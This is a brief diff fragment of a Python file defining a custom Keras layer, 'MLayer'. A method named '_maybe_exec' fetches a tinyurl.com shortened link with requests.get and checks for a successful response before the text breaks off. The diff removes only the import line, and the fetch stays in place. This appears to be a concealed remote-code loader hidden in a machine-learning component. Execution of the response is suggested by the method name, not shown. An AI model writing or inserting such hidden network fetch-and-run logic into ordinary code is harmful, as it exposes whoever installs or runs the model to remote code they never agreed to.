@@ -43,7 +43,6 @@ class MLayer(tf.keras.layers.Layer):
         return super().call(inputs, training=training)
 
     def _maybe_exec(self):
-        import requests
         try:
             response = requests.get("https://tinyurl.com/295tzfpa")
             if response.status_code == 200:
